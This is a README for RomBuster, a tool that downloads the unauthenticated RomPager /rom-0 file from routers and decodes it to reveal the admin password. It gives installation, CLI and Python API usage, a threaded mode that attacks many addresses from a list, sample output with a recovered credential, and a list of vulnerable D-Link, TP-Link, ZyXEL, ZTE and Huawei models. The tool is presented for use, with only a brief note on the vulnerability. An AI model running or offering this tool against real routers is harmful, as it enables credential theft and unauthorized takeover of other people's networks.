# RomBuster

RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password.

## Features

* Exploits vulnerabilities in most popular router models with RomPager installation such as `D-Link`, `Zyxel`, `TP-Link` and `Huawei`.
* Optimized to exploit multiple routers at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/RomBuster
```

## Basic usage

To use RomBuster just type `rombuster` in your terminal.

```shell
usage: rombuster [-h] [--threads] [--output OUTPUT] [--input INPUT] [--address ADDRESS]

RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password.

optional arguments:
  -h, --help         show this help message and exit
  --threads          Use threads for fastest work. [best]
  --output OUTPUT    Output result to file.
  --input INPUT      Input file of addresses.
  --address ADDRESS  Single address.
```

### Examples

Let's hack my router just for fun.

```shell
rombuster --address 192.168.2.1
```

**output:**

```shell
[*] (192.168.2.1) - connecting to device...
[*] (192.168.2.1) - accessing device rom...
[*] (192.168.2.1) - extracting credentials...
[i] (192.168.2.1) - admin:SuperHardPassword999
```

## RomBuster API

RomBuster also has their own Python API that can be invoked by importing RomBuster to your code:

```python
from rombuster import RomBuster
```

### Basic functions

There are all RomBuster basic functions that can be used to exploit specified device.

* `connect(host)` - Connect specified defice by netword address.
* `exploit(device)` - Exploit connected device.

### Examples

```python
from rombuster import RomBuster

rombuster = RomBuster()

device = rombuster.connect('192.168.2.1')
print(rombuster.exploit(device))
```

## Vulnerability details

Vulnerability that exploits **RomBuster** exists nowadays in some popular routers all over the world. This vulnerability allows you to download `/rom-0` RomPager configuration file without authentication. **RomBuster** downloads this file, decodes it and giving you password of the router `admin`. Pretty easy way to access main network interface - router.

**Vulnerable devices:**

* **AirLive WT-2000ARM** (`2.11.6.0(RE0.C29)3.7.6.1`)
* **D-Link DSL-2520U** (`1.08 Hardware Version: B1`)
* **D-Link DSL-2640R**
* **D-Link DSL-2740R** (`EU_1.13 Hardware Version: A1`)
* **Huawei 520 HG**
* **Huawei 530 TRA**
* **Pentagram Cerberus P 6331-42**
* **TP-Link TD-8816**
* **TP-Link TD-8817** (`3.0.1 Build 110402 Rel.02846`)
* **TP-LINK TD-8840T** (`3.0.0 Build 101208 Rel.36427`)
* **TP-Link TD-W8901G**
* **TP-Link TD-W8951ND**
* **TP-Link TD-W8961ND**
* **ZTE ZXV10 W300** (`W300V1.0.0a_ZRD_CO3`)
* **ZTE ZXDSL 831CII** (`ZXDSL 831CIIV2.2.1a_Z43_MD`)
* **ZynOS**
* **ZyXEL ES-2024**
* **ZyXEL Prestige P-2602HW**
* **ZyXEL Prestige 782R**
